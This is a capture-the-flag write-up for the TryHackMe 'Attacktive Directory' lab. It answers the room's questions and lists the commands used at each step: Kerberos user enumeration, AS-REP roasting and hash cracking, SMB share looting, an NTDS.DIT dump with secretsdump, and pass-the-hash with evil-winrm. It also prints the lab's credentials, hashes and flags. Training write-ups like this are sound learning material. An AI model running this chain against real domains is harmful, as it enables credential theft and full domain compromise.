---
title: AttacktiveDirect
draft: false
tags:
---
This maquina is part of the learning path of TryHackMe.

Machine: https://tryhackme.com/room/attacktivedirectory

# Enumeration
## Welcome to Attacktive Directory
- What tool will allow us to enumerate port 139/445?
>`enum4linux`
- What is the NetBIOS-Domain Name of the machine?
>`THM-AD`

```bash
nmap -sS -p- -Pn -n --min-rate 5000 10.10.130.13
nmap -p53,80,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389 -sCV -n -Pn --min-rate 5000 10.10.130.13 -oN Targeted
```
>[!example]- Result
>![[Pasted image 20250310191050.png]]

- What invalid TLD do people commonly use for their Active Directory Domain?
>`.local`

## Enumerating Users via Kerberos
- What command within Kerbrute will allow us to enumerate valid usernames?
>`userenum`

- What notable account is discovered? (These should jump out at you)
>`svc-admin`
```bash
kerbrute_linux_amd64 userenum --dc spookysec.local -d spookysec.local -t 20 userlist.txt
```
>[!example]- Result
>![[Pasted image 20250310192504.png]]

- What is the other notable account is discovered? (These should jump out at you)
`backup`

# Exploitation
## Abusing Kerberos
- We have two user accounts that we could potentially query a ticket from. Which user account can you query a ticket from with no password?
>`svc-admin`

```bash
impacket-GetNPUsers spookysec.local/ -no-pass -usersfile validUsers -o TGTs
```
>[!example]- Result
>![[Pasted image 20250310193506.png]]


- Looking at the Hashcat Examples Wiki page, what type of Kerberos hash did we retrieve from the KDC? (Specify the full name)
>[Web](https://hashcat.net/wiki/doku.php?id=example_hashes) 
>`Kerberos 5, etype 23, AS-REP`

- What mode is the hash?
>`18200`

>[!example]- Result
>![[Pasted image 20250310193920.png]]

- Now crack the hash with the modified password list provided, what is the user accounts password?
>`management2005`

```bash
hashcat -m 18200 TGTs passwordlist.txt --force
```
>[!example]- Result
>![[Pasted image 20250310194059.png]]

# Enumeration
## Back to the Basics
- What utility can we use to map remote SMB shares?
>`smbclient`
- Which option will list shares?
`-L`
- How many remote shares is the server listing?
>`6`

```bash
smbclient -L //10.10.130.13 -U spookysec.local/svc-admin%management2005
```
>[!example]- Result
>![[Pasted image 20250310194957.png]]

- There is one particular share that we have access to that contains a text file. Which share is it?
>`backup`
```bash
crackmapexec smb 10.10.130.13 -u 'svc-admin' -p 'management2005' --shares -d spookysec.local
```
>[!example]- Result
>![[Pasted image 20250310195335.png]]

- What is the content of the file?
>`YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw`
```bash
smbclient //10.10.130.13/backup -U spookysec.local/svc-admin%management2005 -c 'get backup_credentials.txt' ; cat backup_credentials.txt
```
>[!example]- Result
>![[Pasted image 20250310195750.png]]

- Decoding the contents of the file, what is the full contents?
>`backup@spookysec.local:backup2517860`

```bash
echo -n 'YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw' | base64 -d -w 0
```
>[!example]- Result
>![[Pasted image 20250310200004.png]]

# Domain Privilege Escalation
## Elevating Privileges within the Domain
- What method allowed us to dump NTDS.DIT?
>`DRSUAPI`

```bash
secretsdump.py 'spookysec.local'/'backup':'backup2517860'@'10.10.130.13' -outputfile NTLMhashes
```
>[!example]- Result
>![[Pasted image 20250310200935.png]]

- What is the Administrators NTLM hash?
>`0e0363213e37b94221497260b0bcb4fc`

- What method of attack could allow us to authenticate as the user without the password?
>`pass the hash`

- Using a tool called Evil-WinRM what option will allow us to use a hash?
>`-H`
```bash
evil-winrm -H '0e0363213e37b94221497260b0bcb4fc' -u Administrator -i 10.10.130.13
```
>[!example]- Result
>![[Pasted image 20250310201321.png]]

# Flag Submission
## Flag Submission Panel
- svc-admin
>`TryHackMe{K3rb3r0s_Pr3_4uth}`

```bash
cat /Users/svc-admin/Desktop/user.txt.txt
```
>[!example]- Result
>![[Pasted image 20250310201807.png]]

- backup
>`TryHackMe{B4ckM3UpSc0tty!}`

```bash
cat /Users/backup/Desktop/PrivEsc.txt
```
>[!example]- Result
>![[Pasted image 20250310201717.png]]

- Administrator
>`TryHackMe{4ctiveD1rectoryM4st3r}`

```bash
cat /Users/Administrator/Desktop/root.txt
```
>[!example]- Result
>![[Pasted image 20250310201945.png]]

